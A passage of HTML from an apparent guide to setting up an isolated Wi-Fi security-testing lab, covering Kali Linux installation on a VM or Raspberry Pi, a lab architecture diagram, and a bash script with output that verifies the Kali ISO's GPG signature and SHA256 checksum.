 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Make sure virtualization (Intel VT or AMD-V) is enabled in your computer’s BIOS/UEFI settings.&lt;/li&gt;
&lt;li&gt;Allocate at least &lt;strong&gt;2 GB of RAM&lt;/strong&gt; and &lt;strong&gt;20 GB of disk space&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Set the network adapter to &lt;strong&gt;&amp;ldquo;Bridged Adapter&amp;rdquo;&lt;/strong&gt; to give Kali access to your local network.&lt;/li&gt;
&lt;li&gt;Use a &lt;strong&gt;USB Wi-Fi adapter that supports monitor mode&lt;/strong&gt;, and pass it through to the VM.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 class="heading-element" id="option-2-installing-kali-linux-on-a-raspberry-pi"&gt;&lt;span&gt;20.2 Option 2: Installing Kali Linux on a Raspberry Pi&lt;/span&gt;
 &lt;a href="#option-2-installing-kali-linux-on-a-raspberry-pi" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Required hardware&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Raspberry Pi 4&lt;/li&gt;
&lt;li&gt;MicroSD card (minimum 16 GB)&lt;/li&gt;
&lt;li&gt;Power supply, keyboard, mouse, and HDMI screen&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 class="heading-element" id="option-2-downloads-links"&gt;&lt;span&gt;20.2.1 Option 2 Downloads Links&lt;/span&gt;
 &lt;a href="#option-2-downloads-links" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kali.org/get-kali/#kali-arm"target="_blank" rel="external nofollow noopener noreferrer"&gt;Kali Linux ARM image for Raspberry Pi&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 class="heading-element" id="option-2-installations-steps"&gt;&lt;span&gt;20.2.2 Option 2 Installations Steps&lt;/span&gt;
 &lt;a href="#option-2-installations-steps" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;Use &lt;a href="https://www.raspberrypi.org/software/"target="_blank" rel="external nofollow noopener noreferrer"&gt;Raspberry Pi Imager&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; or a similar tool to flash the Kali image onto the microSD card.&lt;/li&gt;
&lt;li&gt;Insert the card into the Raspberry Pi, connect all peripherals, and boot it up.&lt;/li&gt;
&lt;li&gt;Follow the on-screen setup instructions and ensure your Wi-Fi adapter is compatible with monitor mode.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="architecture"&gt;&lt;span&gt;21 Architecture&lt;/span&gt;
 &lt;a href="#architecture" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;The architecture of a Wi-Fi hacking lab is designed to create a controlled environment for safely testing wireless security. At the core of the lab is the Attacker Machine (Kali Linux), which runs penetration testing tools to perform attacks on the Target Access Point (Test AP). The Test Client Device connects to the AP, simulating a user’s interaction with the network. The Isolation Switch/Firewall ensures the lab is separated from the wider network and blocks unauthorized internet access, protecting the external network from any potential disruption. Finally, the Monitoring &amp;amp; Logging Station captures and analyzes the traffic between the attacker, the AP, and the client, allowing for detailed analysis and logging of all actions. This setup ensures that wireless security testing can be performed safely and ethically within an isolated environment.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph TD
 attacker["Attacker Machine (Kali Linux)"]
 ap["Target Access Point (Test AP)"]
 client["Test Client Device"]
 firewall["Isolation Switch / Firewall"]
 monitor["Monitoring &amp; Logging Station"]
 Internet["Internet"]

 attacker --&gt;|Inject &amp; Capture Traffic| ap
 client --&gt;|Connects to| ap
 ap --&gt;|Connects through| firewall
 attacker --&gt;|Sends data for analysis| monitor
 client --&gt;|Traffic monitored by| monitor
 firewall -.-&gt;|Blocks traffic to Internet| Internet
 
 class attacker,ap,client,firewall,monitor,Internet neutral;&lt;/pre&gt;
&lt;template&gt;graph TD
 attacker["Attacker Machine (Kali Linux)"]
 ap["Target Access Point (Test AP)"]
 client["Test Client Device"]
 firewall["Isolation Switch / Firewall"]
 monitor["Monitoring &amp; Logging Station"]
 Internet["Internet"]

 attacker --&gt;|Inject &amp; Capture Traffic| ap
 client --&gt;|Connects to| ap
 ap --&gt;|Connects through| firewall
 attacker --&gt;|Sends data for analysis| monitor
 client --&gt;|Traffic monitored by| monitor
 firewall -.-&gt;|Blocks traffic to Internet| Internet
 
 class attacker,ap,client,firewall,monitor,Internet neutral;&lt;/template&gt;&lt;h2 class="heading-element" id="checksum"&gt;&lt;span&gt;22 Checksum&lt;/span&gt;
 &lt;a href="#checksum" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;div class="alert alert-warning"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z"/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;Before proceeding with creating the virtual machine, it&amp;rsquo;s strongly recommended to &lt;strong&gt;verify the SHA256 checksum&lt;/strong&gt; of the Kali Linux ISO. This helps ensure that the file has not been corrupted during download or maliciously altered. Verifying the checksum is an important security step to ensure the integrity of the ISO file, especially when downloading from the internet. Without this verification, you could be running a compromised version of Kali Linux, which could expose your system to unnecessary risks.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Here’s how you can verify the checksum and ensure that the ISO is safe to use:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;set&lt;/span&gt; -e
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;VERSION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;2025.1c&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;BASE_URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;https://cdimage.kali.org/kali-&lt;/span&gt;&lt;span class="nv"&gt;$VERSION&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;ISO&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;kali-linux-&lt;/span&gt;&lt;span class="nv"&gt;$VERSION&lt;/span&gt;&lt;span class="s2"&gt;-installer-amd64.iso&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Creating download directory...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir -p ~/Downloads/iso/kali-&lt;span class="nv"&gt;$VERSION&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/Downloads/iso/kali-&lt;span class="nv"&gt;$VERSION&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Downloading Kali Linux ISO and verification files...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wget -q --show-progress &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$BASE_URL&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;$ISO&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wget -q --show-progress &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$BASE_URL&lt;/span&gt;&lt;span class="s2"&gt;/SHA256SUMS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wget -q --show-progress &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$BASE_URL&lt;/span&gt;&lt;span class="s2"&gt;/SHA256SUMS.gpg&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Importing Kali Linux official GPG key...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gpg --keyserver hkps://keyserver.ubuntu.com --recv-keys 44C6513A8E4FB3D30875F758ED444FF07D8D0BF6
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Verifying SHA256SUMS signature...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gpg --verify SHA256SUMS.gpg SHA256SUMS
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Verifying ISO checksum...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sha256sum -c SHA256SUMS 2&amp;gt;/dev/null &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$ISO&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;All done! If you see &amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;$ISO&lt;/span&gt;&lt;span class="s2"&gt;: OK&amp;#39; above, your ISO is verified and safe to use.&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Creating&lt;/span&gt; &lt;span class="n"&gt;download&lt;/span&gt; &lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Downloading&lt;/span&gt; &lt;span class="n"&gt;Kali&lt;/span&gt; &lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="n"&gt;ISO&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;verification&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;kali&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2025.1&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;installer&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;===========================================&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mf"&gt;4.13&lt;/span&gt;&lt;span class="n"&gt;G&lt;/span&gt; &lt;span class="mi"&gt;107&lt;/span&gt;&lt;span class="n"&gt;MB&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;SHA256SUMS&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;===========================================&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mf"&gt;2.80&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt; &lt;span class="o"&gt;--.-&lt;/span&gt;&lt;span class="n"&gt;KB&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;SHA256SUMS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gpg&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;===========================================&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mi"&gt;833&lt;/span&gt; &lt;span class="o"&gt;--.-&lt;/span&gt;&lt;span class="n"&gt;KB&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Importing&lt;/span&gt; &lt;span class="n"&gt;Kali&lt;/span&gt; &lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="n"&gt;official&lt;/span&gt; &lt;span class="n"&gt;GPG&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;ED444FF07D8D0BF6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="n"&gt;duplicate&lt;/span&gt; &lt;span class="n"&gt;signatures&lt;/span&gt; &lt;span class="n"&gt;removed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;ED444FF07D8D0BF6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Kali Linux Repository &amp;lt;devel@kali.org&amp;gt;&amp;#34;&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;changed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Total&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt; &lt;span class="n"&gt;processed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;unchanged&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Verifying&lt;/span&gt; &lt;span class="n"&gt;SHA256SUMS&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Signature&lt;/span&gt; &lt;span class="n"&gt;made&lt;/span&gt; &lt;span class="n"&gt;Thu&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt; &lt;span class="n"&gt;Apr&lt;/span&gt; &lt;span class="mi"&gt;2025&lt;/span&gt; &lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="n"&gt;AM&lt;/span&gt; &lt;span class="n"&gt;CEST&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;using&lt;/span&gt; &lt;span class="n"&gt;RSA&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="mi"&gt;827&lt;/span&gt;&lt;span class="n"&gt;C8569F2518CC677FECA1AED65462EC8D5E4C5&lt;/span&gt;
